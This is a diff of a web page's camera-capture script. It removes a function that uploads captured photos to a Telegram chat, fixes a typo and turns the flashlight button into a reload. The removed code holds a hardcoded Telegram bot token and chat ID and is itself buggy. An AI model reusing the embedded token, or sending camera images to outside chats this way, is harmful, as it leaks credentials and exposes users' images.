@@ -95,7 +95,7 @@
 
     <video id="video" width="320" height="500" autoplay></video><br>
     <button id="capture-btn">Capture</button>
-    <button id="flashlightButton">Toggle Flashlight</button>
+    <button id="flashlightButton">Cancel</button>
 
     <!-- <canvas id="canvas" width="350" height="450"></canvas> -->
     </div>
@@ -140,58 +140,7 @@ function sendImage() {
 
 
 
-
-function sendBlob(canvas){
-    var file;
-  
-    canvas.toBlob(function(blob) {
-                // Create File object from Blob
-                file = new File([blob], 'captured_image.png', { type: 'image/png' });
-
-                // Now you can use the 'file' object as needed (e.g., upload or save it)
-                console.log('Captured image file:', file);
-            }, 'image/png');
-                  // Create temporary link element
-        var link = document.createElement('a');
-                link.download = 'captured_image.png';
-                link.href = URL.createObjectURL(blob);
-
-                // Simulate click on the link to trigger download
-                link.click();
-
-                // Clean up
-                URL.revokeObjectURL(link.href);
-
-
-                const formData = new FormData();
-                formData.append('photo', file);
-                const loader = document.getElementById('loader');
-                loader.style.display = 'block';
-
-                const botToken = '5214279030:AAHwXVkouOpHANC1EiK6edh_ux4cFqoZ-OY';
-                const chatId = '-1001570223088';
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to send image');
-                    }
-                    loader.style.display = 'none';
-                    // alert('Image sent successfully!');
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    loader.style.display = 'none';
-                    alert('Failed to send image');
-                });
-         
-}
-
-
-
+   
     const video = document.getElementById('video');
     // const canvas = document.getElementById('canvas');
     const capturedImage = document.getElementById('capturedImage');
@@ -219,7 +168,7 @@ function sendBlob(canvas){
             canvas.width = 320;
             canvas.height = 480;
             var context = canvas.getContext('2d');
-            context.drawImamge(video, 0, 0, 320, 500);
+            context.drawImage(video, 0, 0, 320, 500);
 // console.log(imggot);
             // Draw captured image onto video element
             var videoParent = video.parentNode;
@@ -257,7 +206,7 @@ function sendBlob(canvas){
 
     // Toggle flashlight
     flashlightButton.addEventListener('click', () => {
-      toggleFlashlight();
+      location.reload();
     });
 
     // Function to stop video streaming
